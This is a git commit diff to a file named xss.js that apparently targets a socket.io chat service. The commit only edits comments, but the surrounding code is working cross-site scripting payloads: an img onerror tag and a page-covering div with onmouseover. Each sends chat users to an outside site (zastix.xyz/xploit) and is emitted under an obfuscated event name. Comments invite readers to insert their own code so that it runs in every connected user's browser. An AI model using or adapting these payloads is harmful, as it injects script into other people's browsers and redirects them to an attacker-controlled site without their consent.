8bb80cbb566a50bfa962c1b61e7d31a2253b5a02
zastix <69748767+ZasticBradyn@users.noreply.github.com>
2022-04-14 15:12:24 -0500

    Update xss.js

--- xss.js
+++ xss.js
@@ -1,4 +1,4 @@
-// OnError method
+// IMG OnError method
 xxs = `<img src="e.png" onerror="location.href='https://zastix.xyz/xploit'">`
 socket.emit('b̵̳̜̍͋̇̌ǫ̶̺̥͉̳̙͎̱̳̩͋̽̃͝z̸̨̛̛̛͕̮͙̜͕̪͓̜̱̪̗̻̓̽͂̂̌̀̂͜ͅo̶̧͔̫̻̠̭͇̱̖̹̊͜', {
     message: "",
@@ -7,7 +7,7 @@ socket.emit('b̵̳̜̍͋̇̌ǫ̶̺̥͉̳̙͎̱̳̩͋̽̃͝z̸̛̛̛̓̽͂̂̌̀
 // Put your minified code in onerror="CODE HERE"
 // it will then run on everyone's broswer, that is connected to the chat
 
-// Div method
+// div onmouseover method
 xxs = `<div style="transform:translate(-50%,-20%);width:10000px;height:10000px;background-color:black;position:absolute;" onmouseover=location.href="https://zastix.xyz/xploit">`
 socket.emit('b̵̳̜̍͋̇̌ǫ̶̺̥͉̳̙͎̱̳̩͋̽̃͝z̸̨̛̛̛͕̮͙̜͕̪͓̜̱̪̗̻̓̽͂̂̌̀̂͜ͅo̶̧͔̫̻̠̭͇̱̖̹̊͜', {
     message: "",
